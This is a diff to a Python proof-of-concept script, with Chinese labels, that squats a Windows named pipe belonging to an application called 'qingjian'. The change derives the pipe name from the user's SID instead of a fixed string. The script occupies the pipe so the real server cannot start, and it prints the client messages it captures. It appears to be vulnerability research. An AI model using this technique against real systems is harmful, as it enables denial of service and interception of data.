@@ -36,7 +36,7 @@ import struct
 import sys
 import time
 
-DEFAULT_PIPE = r"\\.\pipe\qingjian"
+from pipe_name import default_pipe_name
 
 PIPE_ACCESS_DUPLEX = 0x00000003
 PIPE_TYPE_BYTE = 0x00000000
@@ -113,7 +113,7 @@ def describe(message: dict) -> str:
 
 def main() -> int:
     parser = argparse.ArgumentParser(description="青简命名管道抢注 PoC（只读）")
-    parser.add_argument("--pipe", default=DEFAULT_PIPE, help="管道名")
+    parser.add_argument("--pipe", help="管道名（缺省按当前用户的 SID 派生）")
     parser.add_argument("--hold", type=float, default=0.0, help="占位多少秒后退出（0 = 收到一条就退出）")
     parser.add_argument("--messages", type=int, default=1, help="最多打印几条消息")
     args = parser.parse_args()
@@ -121,6 +121,8 @@ def main() -> int:
     if os.name != "nt":
         print("这个 PoC 只对 Windows 的命名管道有效", file=sys.stderr)
         return 1
+
+    args.pipe = args.pipe or default_pipe_name()
 
     handle = create_instance(args.pipe)
     print(f"已占用 {args.pipe}：真的 qingjian-server.exe 现在起不来（它用 FILE_FLAG_FIRST_PIPE_INSTANCE）")
